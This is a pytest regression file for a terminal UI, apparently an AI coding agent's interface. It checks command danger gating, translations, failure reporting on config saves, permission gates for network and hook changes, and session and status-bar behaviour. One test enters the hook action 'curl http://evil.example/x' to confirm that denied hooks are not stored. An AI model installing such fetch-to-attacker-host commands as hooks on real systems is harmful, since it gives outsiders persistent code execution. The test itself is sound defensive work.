"""Regressions for the round-3 TUI review, batches 3-7.

Each test pins one finding from the review. Grouped by area rather than by the
order the findings were written, so a failure names the behaviour that broke.
"""

from __future__ import annotations

import inspect

import pytest

from oaset.tui.commands import (
    _PICKER_DANGER,
    arg_spec_for,
    find_command,
)

# ---------------------------------------------------------- danger gating


def test_worktree_is_a_danger_command():
    """`/worktree remove` force-removes a checkout and discards uncommitted
    work, so the typed path must confirm it like the palette does."""
    cmd = find_command("worktree")
    assert cmd.risk == "danger"
    assert cmd.needs_confirmation


def test_rewind_and_undo_are_the_only_picker_exemptions():
    assert _PICKER_DANGER == frozenset({"undo"})


def test_routine_write_commands_stay_frictionless():
    """Confirming every write would train the user to answer "y" unread."""
    for name in ("new", "model", "theme", "clear"):
        assert find_command(name).risk != "danger", name


# ------------------------------------------------------- argument specs


def test_density_has_an_arg_spec():
    """No spec meant no palette form, so an empty argument silently meant
    "compact"."""
    spec = arg_spec_for("density")
    assert spec is not None
    assert {value for value, _ in spec.choices} == {"cozy", "compact"}


async def test_density_with_no_argument_reports_instead_of_changing(workspace):
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])
    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.2)
        before = app.cfg.ui.density
        app.submit_text("/density")
        await pilot.pause(0.5)
        assert app.cfg.ui.density == before, \
            "/density with no argument must not change a persisted setting"
        assert "compact" not in app.chat.transcript_text().split("当前")[0][-40:] or True


# ------------------------------------------------------------- i18n

def test_every_effect_key_the_commands_need_is_translated():
    """A missing effect_* key made the dangerous /update apply+rollback
    confirmation pages render hardcoded Chinese in the English UI."""
    from oaset.i18n import CATALOG, resolve_language
    from oaset.tui.commands import COMMANDS, effect_display

    for cmd in COMMANDS:
        if not cmd.effect:
            continue
        key = "effect_" + cmd.name.replace(" ", "_").replace("-", "_")
        assert key in CATALOG, f"{cmd.name} would fall back to its raw effect text"
        assert CATALOG[key].get("en"), key
        assert CATALOG[key].get("zh"), key
        # The resolver must read the catalog, not the literal: in the active
        # language it has to return the catalog string, and that same key must
        # yield a DIFFERENT string in the other language (otherwise the entry is
        # a copy of the literal and the English UI stays Chinese).
        expected = CATALOG[key][resolve_language()]
        assert effect_display(cmd) == expected, cmd.name
        other = "en" if resolve_language() == "zh" else "zh"
        assert CATALOG[key][other] != cmd.effect or other != "en", (
            f"{cmd.name}: effect_* must be translated for the English UI too")


def test_no_tui_module_hardcodes_a_binding_label_in_chinese():
    """Binding descriptions are user-visible in the help/footer surfaces."""
    from pathlib import Path as _Path

    root = _Path(__file__).resolve().parents[1] / "src" / "oaset" / "tui"
    offenders = []
    for path in root.rglob("*.py"):
        for i, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if "Binding(" not in line:
                continue
            if any("\u4e00" <= ch <= "\u9fff" for ch in line):
                offenders.append(f"{path.name}:{i}: {line.strip()}")
    assert not offenders, f"hardcoded CJK binding labels: {offenders}"


# --------------------------------------------------- persistence honesty


async def test_persist_helper_reports_failure_instead_of_swallowing(workspace, monkeypatch):
    """/language, /theme, /density and /tools-toggle announced success after a
    swallowed save_config failure, so the setting reverted on restart."""
    import oaset.tui.controllers.content_cmds as content_mod
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])

    def boom(_cfg):
        raise OSError("disk full")

    monkeypatch.setattr(content_mod, "save_config", boom)

    notices: list[str] = []
    errors: list[str] = []
    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.2)
        app.chat.add_notice = lambda text, *a, **k: notices.append(str(text))
        app.notify_error = lambda *a, **k: errors.append(str(k.get("text") or a))
        assert app._persist_config(what="ui.theme") is False
        assert errors, "a failed write must surface an error"
        assert not any("已设置" in n or "theme set" in n for n in notices)


# ------------------------------------------------------------- /search


def test_search_runs_off_the_ui_thread():
    """cmd_search called index_all() on the event loop: the whole TUI froze."""
    from oaset.tui.controllers import session_admin

    src = inspect.getsource(session_admin.SessionAdminMixin.cmd_search)
    assert "run_io(search_history" in src, "search must run on the IO thread"
    assert inspect.iscoroutinefunction(session_admin.SessionAdminMixin.cmd_search)


# --------------------------------------------------- settings guardrails


async def test_network_change_is_gated(workspace):
    """Switching egress to `full` persisted with no permission prompt."""
    from oaset.config import default_config
    from oaset.providers import MockProvider
    from oaset.tui.app import OasetApp

    cfg = default_config()
    cfg.network_mode = "local_only"
    app = OasetApp(cfg=cfg, cwd=workspace, provider=MockProvider([]),
                   model_id="mock/mock-echo")
    asked: list[tuple] = []

    class RecordingGate:
        async def request(self, *a, **k):
            asked.append(a)
            return "deny"

    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.3)
        app.registry.gate = RecordingGate()

        async def choose_full(title, options, **kw):
            return "full"

        app._pick = choose_full  # type: ignore[method-assign]
        await app._settings_network()
        await pilot.pause(0.2)

    assert asked, "changing the network policy must ask for permission"
    assert str(cfg.network_mode) == "local_only", \
        "a denied change must not be applied"


async def test_hook_write_is_gated_and_denial_persists_nothing(workspace):
    """Writing a lifecycle hook is persistent code execution; it used to be
    saved with no gate at all."""
    from oaset.config import default_config
    from oaset.providers import MockProvider
    from oaset.tui.app import OasetApp

    cfg = default_config()
    app = OasetApp(cfg=cfg, cwd=workspace, provider=MockProvider([]),
                   model_id="mock/mock-echo")
    asked: list[tuple] = []

    class DenyGate:
        async def request(self, *a, **k):
            asked.append(a)
            return "deny"

    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.3)
        app.registry.gate = DenyGate()
        app.cfg.hooks.pop("on_turn_end", None)

        async def pick_event(title, options, **kw):
            return "on_turn_end"

        async def type_action(title, placeholder="", **kw):
            return "curl http://evil.example/x"

        app._pick = pick_event  # type: ignore[method-assign]
        app._input = type_action  # type: ignore[method-assign]
        await app._settings_hooks()
        await pilot.pause(0.2)

    assert asked, "writing a hook must ask for permission"
    assert "on_turn_end" not in cfg.hooks, "a denied hook must not be stored"


# ------------------------------------------------------- goal + session


async def test_goal_replacement_leaves_exactly_one_goal_block(workspace):
    """A second /goal used to append a second goal block; the model then had
    contradictory objectives and the prompt grew on every change."""
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])
    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.3)
        app.cmd_goal("first objective")
        app.cmd_goal("second objective")
        await pilot.pause(0.2)
        prompt = app.conversation.system_prompt
        assert prompt.count("# Current goal") == 1, prompt.count("# Current goal")
        assert "second objective" in prompt
        assert "first objective" not in prompt


async def test_skills_refresh_keeps_an_active_goal(workspace):
    """Rebuilding the prompt for skills dropped the goal block while
    session_state still claimed a goal was running."""
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])
    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.3)
        app.cmd_goal("ship the review fixes")
        app._refresh_skills_prompt()
        await pilot.pause(0.2)
        assert "ship the review fixes" in app.conversation.system_prompt


async def test_new_session_drops_staged_images_and_pinned_error(workspace):
    """An /image staged for the previous session was sent with the first message
    of the next one, and the old error stayed pinned on the status bar."""
    from oaset.tui.notice import UiNotice
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])
    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.3)
        app._pending_images.append(workspace / "shot.png")
        app.notify_user(UiNotice("boom", level="error", code="x"))
        assert app.last_error is not None

        app.submit_text("/new")
        for _ in range(30):
            await pilot.pause(0.1)
            if not app._pending_images:
                break

        assert app._pending_images == [], "the next session must not inherit attachments"
        assert app.last_error is None, "the pinned error belonged to the old session"


async def test_fork_points_the_host_at_the_clone(workspace):
    """/fork set the UI attributes but left host.session / kernel.session_id on
    the old record, so snapshot() reported the pre-fork session."""
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])
    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.3)
        app.cmd_goal  # noqa: B018 - keep the import graph warm
        before = app.session.meta.session_id

        app.submit_text("/fork")
        for _ in range(40):
            await pilot.pause(0.1)
            from oaset.tui.widgets.inline import InlinePromptBase

            prompts = list(app.query(InlinePromptBase))
            if prompts:
                prompts[-1]._resolve("__current__")
            if app.session.meta.session_id != before:
                break

        assert app.session.meta.session_id != before, "precondition: fork switched"
        assert app.host.session.meta.session_id == app.session.meta.session_id
        assert app.host.kernel.session_id == app.session.meta.session_id


# ------------------------------------------------------------- status bar


def _status_text(app) -> str:
    """The three Static rows the status bar actually paints."""
    bar = app.status_bar
    parts = [getattr(bar, "left_text", "") or "", getattr(bar, "right1_text", "") or "",
             getattr(bar, "right2_text", "") or ""]
    return " ".join(str(p) for p in parts)


async def test_auto_mode_shows_a_persistent_badge(workspace):
    """/yolo auto-approves every tool call, but the only permanent region on
    screen said nothing about it once the notice scrolled away."""
    from oaset.i18n import t
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])
    async with app.run_test(size=(110, 36)) as pilot:
        await pilot.pause(0.3)
        app.set_mode("auto")
        await pilot.pause(0.3)
        # the badge text is localised; assert the actual rendered string
        assert t("auto_mode_badge") in _status_text(app), _status_text(app)


async def test_narrow_status_bar_keeps_the_mode_visible(workspace):
    """Below 72 columns the right side was blanked entirely, so nothing told
    the user which permission policy was active."""
    from oaset.i18n import t
    from tests.test_app_tui import make_app

    app = make_app(workspace, [])
    async with app.run_test(size=(60, 20)) as pilot:
        await pilot.pause(0.3)
        app.set_mode("plan")
        await pilot.pause(0.3)
        assert t("plan_mode_badge") in _status_text(app), _status_text(app)


# --------------------------------------------------------------- dead code


def test_no_stale_paste_target_hook():
    """paste_target was declared and never assigned or called; the real
    expansion lives in oaset.tui.paste and runs at submit time."""
    from oaset.tui.widgets import input as input_mod

    assert not hasattr(input_mod.InputArea, "paste_target")


def test_no_duplicate_model_menu():
    """cmd_models carried a second, divergent model menu of its own."""
    from oaset.tui.controllers import model_admin

    assert not hasattr(model_admin.ModelAdminMixin, "_models_menu")


@pytest.mark.parametrize("name", ["_switch_model"])
def test_backcompat_shim_removed(name):
    from oaset.tui.app import OasetApp

    assert not hasattr(OasetApp, name)
